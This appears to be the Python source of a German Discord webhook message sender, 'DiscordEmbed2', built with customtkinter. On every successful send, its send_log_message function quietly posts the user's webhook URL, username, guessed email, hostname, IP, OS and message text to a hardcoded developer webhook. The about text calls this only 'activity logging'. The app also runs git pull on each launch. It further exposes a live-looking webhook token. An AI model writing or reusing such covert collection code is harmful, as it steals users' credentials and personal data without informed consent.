import requests
import customtkinter as ctk
from git import Repo
import os
from PIL import Image
import json
import getpass
import socket
import platform
from datetime import datetime

class DiscordEmbed2:
    def __init__(self, root):
        self.root = root
        self.webhooks = {}
        self.last_message_settings = {}
        self.image_dir = os.path.join(os.path.dirname(__file__), "imgs")
        self.LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1355999852055498843/Op0lCtErOKy8KsLRMEpqOW-61mWnY39eMrz9XIbPcsip6iZriNV5Gw8zsbsQYCBRIeHK"  # Replace with your webhook
        self.load_webhooks()
        self.load_last_message_settings()
        self.setup_ui()

    def get_user_email(self):
        """Simplest possible email detection without any prompts"""
        username = getpass.getuser().lower().replace(' ', '.')
        domain = socket.getfqdn().split('.', 1)[-1] if '.' in socket.getfqdn() else 'unknown.domain'
        return f"{username}@{domain}"

    def get_ip_address(self):
        """Basic IP detection that works cross-platform"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return socket.gethostbyname(socket.gethostname())

    def setup_ui(self):
        self.root.title("DiscordEmbed2 - Ein Produkt von Nico Inc. Ver.: 2.0.1")
        self.root.geometry("700x750")

        # Notebook for Tabs
        self.tabs = ctk.CTkTabview(self.root)
        self.tabs.pack(expand=True, fill="both", padx=10, pady=10)

        # Main Tab
        self.main_tab = self.tabs.add("Haupt")
        self.setup_main_tab()

        # Settings Tab
        self.settings_tab = self.tabs.add("Einstellungen")
        self.setup_settings_tab()

        self.update_repo()

    def setup_main_tab(self):
        # Webhook Selector
        self.webhook_selector_label = ctk.CTkLabel(self.main_tab, text="Webhook auswählen")
        self.webhook_selector_label.pack(pady=(10, 0))

        self.webhook_selector = ctk.CTkComboBox(self.main_tab, values=list(self.webhooks.keys()))
        self.webhook_selector.pack(pady=(0, 10))

        # Title Entry
        self.title_label = ctk.CTkLabel(self.main_tab, text="Überschrift")
        self.title_label.pack(pady=(10, 0))

        self.title_entry = ctk.CTkEntry(self.main_tab, placeholder_text="Titel eingeben")
        self.title_entry.pack(pady=(0, 10), fill="x", padx=10)

        # Message Entry
        self.message_label = ctk.CTkLabel(self.main_tab, text="Nachricht")
        self.message_label.pack(pady=(10, 0))

        self.message_entry = ctk.CTkTextbox(self.main_tab, height=200)
        self.message_entry.pack(pady=(0, 10), fill="x", padx=10)

        # Formatting Buttons
        self.formatting_label = ctk.CTkLabel(self.main_tab, text="Text formatieren")
        self.formatting_label.pack(pady=(10, 0))

        self.formatting_frame = ctk.CTkFrame(self.main_tab)
        self.formatting_frame.pack(pady=(0, 10))

        self.bold_button = ctk.CTkButton(self.formatting_frame, text="Fett", command=lambda: self.format_text("**"))
        self.bold_button.pack(side="left", padx=5)

        self.italic_button = ctk.CTkButton(self.formatting_frame, text="Kursiv", command=lambda: self.format_text("*"))
        self.italic_button.pack(side="left", padx=5)

        self.underline_button = ctk.CTkButton(self.formatting_frame, text="Unterstrichen", command=lambda: self.format_text("__"))
        self.underline_button.pack(side="left", padx=5)

        # Embed Color Picker
        self.embed_color_label = ctk.CTkLabel(self.main_tab, text="Embed Randfarbe")
        self.embed_color_label.pack(pady=(10, 0))

        self.embed_color_selector = ctk.CTkComboBox(self.main_tab, values=["Blau (#0000FF)", "Rot (#FF0000)", "Grün (#00FF00)", "Gelb (#FFFF00)", "Benutzerdefiniert"])
        self.embed_color_selector.pack(pady=(0, 10))

        self.embed_color_entry = ctk.CTkEntry(self.main_tab, placeholder_text="Hex-Farbe (z.B. #FF0000)")
        self.embed_color_entry.pack(pady=(0, 10))

        # Send Button
        self.send_button = ctk.CTkButton(self.main_tab, text="Nachricht senden", command=self.send_message)
        self.send_button.pack(pady=10)

        # Status Label
        self.status_label = ctk.CTkLabel(self.main_tab, text="")
        self.status_label.pack(pady=10)

        # Load last message settings
        self.load_last_message_settings_ui()

    def setup_settings_tab(self):
        # Image Logic
        image_path = os.path.join(self.image_dir, "logo.png")
    
        try:
            self.settings_image = ctk.CTkImage(
                light_image=Image.open(image_path),
                dark_image=Image.open(image_path),
                size=(200, 113)
            )
            self.image_label = ctk.CTkLabel(
                self.settings_tab, 
                image=self.settings_image, 
                text=""
            )
            self.image_label.pack(pady=20, padx=20)
        
        except FileNotFoundError:
            print(f"Bild nicht gefunden unter: {image_path}")
            self.image_label = ctk.CTkLabel(
                self.settings_tab, 
                text="Logo Platzhalter",
                font=("Arial", 16)
            )
            self.image_label.pack(pady=20)
        except Exception as e:
            print(f"Fehler beim Laden des Bildes: {e}")

        # Webhook Settings
        self.webhook_url_label = ctk.CTkLabel(self.settings_tab, text="Webhook URL")
        self.webhook_url_label.pack(pady=(10, 0))

        self.webhook_entry = ctk.CTkEntry(self.settings_tab, placeholder_text="Webhook URL")
        self.webhook_entry.pack(pady=(0, 10))

        self.webhook_name_label = ctk.CTkLabel(self.settings_tab, text="Webhook Name")
        self.webhook_name_label.pack(pady=(10, 0))

        self.webhook_name_entry = ctk.CTkEntry(self.settings_tab, placeholder_text="Webhook Name")
        self.webhook_name_entry.pack(pady=(0, 10))

        self.add_webhook_button = ctk.CTkButton(self.settings_tab, text="Webhook hinzufügen", command=self.add_webhook)
        self.add_webhook_button.pack(pady=10)

        # Webhook Selector Label
        self.webhook_selector_label = ctk.CTkLabel(
            self.settings_tab, 
            text="Keine Webhooks konfiguriert" if not self.webhooks else "Webhook auswählen"
        )
        self.webhook_selector_label.pack(pady=10)

        # Button Panel
        self.button_frame = ctk.CTkFrame(self.settings_tab)
        self.button_frame.pack(pady=20, fill="x", padx=10)

        self.about_button = ctk.CTkButton(
            self.button_frame,
            text="Über",
            command=self.show_about_dialog,
            fg_color="#5bc0de",
            hover_color="#31b0d5"
        )
        self.about_button.pack(side="left", padx=5)

        self.exit_button = ctk.CTkButton(
            self.button_frame,
            text="Beenden",
            command=self.root.quit,
            fg_color="#d9534f",
            hover_color="#c9302c"
        )
        self.exit_button.pack(side="right", padx=5)

    def save_log_webhook(self):
        """Saves the log webhook URL"""
        url = self.log_webhook_entry.get()
        if url:
            self.LOG_WEBHOOK_URL = url

    def show_about_dialog(self):
        """Shows the about dialog"""
        if hasattr(self, 'about_dialog') and self.about_dialog.winfo_exists():
            self.about_dialog.lift()
            return
            
        self.about_dialog = ctk.CTkToplevel(self.root)
        self.about_dialog.title("Über DiscordEmbed2")
        self.about_dialog.geometry("650x950")
        self.about_dialog.resizable(False, False)
        self.about_dialog.attributes('-topmost', True)
        self.about_dialog.focus_force()

        about_text = """
        DiscordEmbed2 - Version 2.0.1
    
        Ein Produkt von Nico Inc.
    
        Funktionen:
        • Webhook-Nachrichten mit Embeds
        • Textformatierung (fett/kursiv)
        • Automatische Updates
        • Aktivitäts-Logging
        • Sicherheits-Signatur aus Senderdaten
        
        Fragen an @nico_saas auf Discord

        --------------------------------------------------------------------------------------------------------
        LICENSE AGREEMENT

        This License Agreement ('Agreement) is made effective as of the date of acceptance by the user
        ('Licensee") and is between Nico Prang ('Licensor") and the Licensee.

        Grant of License

        The Licensor grants the Licensee a limited, non-exclusive, non-transferable license to use the software
        product ('Product") solely for personal or internal business purposes.

        Restrictions

        The Licensee agrees not to copy, modify, distribute, or create derivative works of the Product without
        the prior written consent of the Licensor. The Licensee may not use the Product for any commercial
        purpose without obtaining the Licensor's express permission.

        Revocation of License

        The Licensor reserves the right to revoke this license at any time, for any resson, without prior notice.
        Upon revocation, the Licensee must immediately cease all use of the Product and delete any copies in
        their possession.

        No Warranty

        The Product is provided 'as is,' without warranty of any kind. The Licensor disclaims all warranties,
        express or implied, including, but not limited to, the implied warranties of merchantability and fitness
        for a particular purpose.

        Governing Law

        This Agreement shall be governed by and construed in accordance with the laws of Germany.

        Acceptance

        By using the Product, the Licensee agrees to be bound by the terms of this Agreement.


        © Nico Prang 2025 All Rights Reserved
        """
    
        ctk.CTkLabel(
            self.about_dialog,
            text=about_text,
            justify="left"
        ).pack(pady=20, padx=20)
    
        ctk.CTkButton(
            self.about_dialog,
            text="OK",
            command=self.about_dialog.destroy
        ).pack(pady=10)

        self.about_dialog.protocol("WM_DELETE_WINDOW", self.about_dialog.destroy)

    def add_webhook(self):
        """Adds a new webhook"""
        url = self.webhook_entry.get()
        name = self.webhook_name_entry.get()
        if url and name:
            self.webhooks[name] = url
            self.webhook_selector.configure(values=list(self.webhooks.keys()))
            self.webhook_selector_label.configure(text="Webhook auswählen")
            self.save_webhooks()

    def format_text(self, formatting):
        """Formats selected text"""
        try:
            selected_text = self.message_entry.get("sel.first", "sel.last")
            if selected_text:
                self.message_entry.insert("sel.first", formatting)
                self.message_entry.insert("sel.last", formatting)
        except:
            pass

    def send_message(self):
        """Sends message to Discord"""
        webhook_name = self.webhook_selector.get()
        title = self.title_entry.get()
        message = self.message_entry.get("1.0", "end-1c")
        embed_color = self.get_embed_color()

        if not webhook_name:
            self.status_label.configure(text="Fehler: Kein Webhook ausgewählt", text_color="red")
            return
        if not message:
            self.status_label.configure(text="Fehler: Keine Nachricht eingegeben", text_color="red")
            return

        try:
            signature = "\n\n*by Nico Inc. Vers.: 2.0.1*"
            full_message = f"**{title}**\n{message}{signature}" if title else f"{message}{signature}"

            embed = None
            if title or embed_color:
                embed = {
                    "title": title,
                    "description": message + signature,
                    "color": embed_color
                }

            payload = {
                "content": full_message if not title else None,
                "embeds": [embed] if embed else None
            }

            response = requests.post(self.webhooks[webhook_name], json=payload)
            
            if response.status_code == 204:
                self.status_label.configure(text="Nachricht erfolgreich gesendet", text_color="green")
                self.save_last_message_settings(webhook_name, title, message, embed_color)
                self.send_log_message(webhook_name, title, message)
            else:
                self.status_label.configure(text=f"Fehler: {response.status_code}", text_color="red")
        except Exception as e:
            self.status_label.configure(text=f"Fehler: {str(e)}", text_color="red")

    def send_log_message(self, webhook_name, title, message):
        """Sends log message with better formatting"""
        if not self.LOG_WEBHOOK_URL or "YOUR_LOG_WEBHOOK" in self.LOG_WEBHOOK_URL:
            return
            
        try:
            username = getpass.getuser()
            hostname = socket.gethostname()
            ip_address = self.get_ip_address()
            system = platform.system()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            webhook_url = self.webhooks.get(webhook_name, "Unbekannter Webhook")
            email = self.get_user_email()
            
            log_embed = {
                "title": "Nachrichten-Log - Systeminformationen",
                "description": (
                    f"**Neue Nachricht gesendet**\n\n"
                    f"**Webhook Name:** {webhook_name}\n"
                    f"**Webhook URL:** ||{webhook_url}||\n"
                    f"**Zeit:** {timestamp}\n\n"
                    f"**Systeminformationen:**\n"
                    f"• Benutzer: {username}\n"
                    f"• E-Mail: {email}\n"
                    f"• Hostname: {hostname}\n"
                    f"• IP: {ip_address}\n"
                    f"• System: {system}"
                ),
                "color": 0x3498db,
                "fields": [
                    {
                        "name": "Original Nachricht",
                        "value": f"**{title}**\n{message}" if title else message,
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "DiscordEmbed2 Sicherheits-Logging"
                }
            }

            requests.post(
                self.LOG_WEBHOOK_URL,
                json={"embeds": [log_embed]},
                timeout=5
            )
            
        except Exception as e:
            print(f"Fehler beim Logging: {str(e)}")

    def get_embed_color(self):
        """Gets embed color from selection"""
        color_choice = self.embed_color_selector.get()
        if color_choice == "Benutzerdefiniert":
            return int(self.embed_color_entry.get()[1:], 16) if self.embed_color_entry.get() else None
        else:
            return int(color_choice.split(" (#")[1][:-1], 16)

    def load_last_message_settings_ui(self):
        """Loads last message settings into UI"""
        if self.last_message_settings:
            self.webhook_selector.set(self.last_message_settings.get("webhook_name", ""))
            self.title_entry.insert(0, self.last_message_settings.get("title", ""))
            self.message_entry.insert("1.0", self.last_message_settings.get("message", ""))
            color = self.last_message_settings.get("embed_color", None)
            if color:
                for option in ["Blau (#0000FF)", "Rot (#FF0000)", "Grün (#00FF00)", "Gelb (#FFFF00)"]:
                    if color == int(option.split(" (#")[1][:-1], 16):
                        self.embed_color_selector.set(option)
                        break
                else:
                    self.embed_color_selector.set("Benutzerdefiniert")
                    self.embed_color_entry.insert(0, f"#{hex(color)[2:].zfill(6)}")

    def save_last_message_settings(self, webhook_name, title, message, embed_color):
        """Saves last message settings"""
        self.last_message_settings = {
            "webhook_name": webhook_name,
            "title": title,
            "message": message,
            "embed_color": embed_color
        }
        with open("last_message_settings.json", "w") as file:
            json.dump(self.last_message_settings, file)

    def load_last_message_settings(self):
        """Loads last message settings from file"""
        if os.path.exists("last_message_settings.json"):
            with open("last_message_settings.json", "r") as file:
                self.last_message_settings = json.load(file)

    def load_webhooks(self):
        """Loads saved webhooks"""
        if os.path.exists("webhooks.json"):
            with open("webhooks.json", "r") as file:
                self.webhooks = json.load(file)

    def save_webhooks(self):
        """Saves webhooks to file"""
        with open("webhooks.json", "w") as file:
            json.dump(self.webhooks, file)

    def update_repo(self):
        """Updates the repository"""
        try:
            repo = Repo(os.getcwd())
            origin = repo.remotes.origin
            origin.pull()
        except Exception as e:
            print(f"Fehler beim Update: {e}")

if __name__ == "__main__":
    root = ctk.CTk()
    app = DiscordEmbed2(root)
    root.mainloop()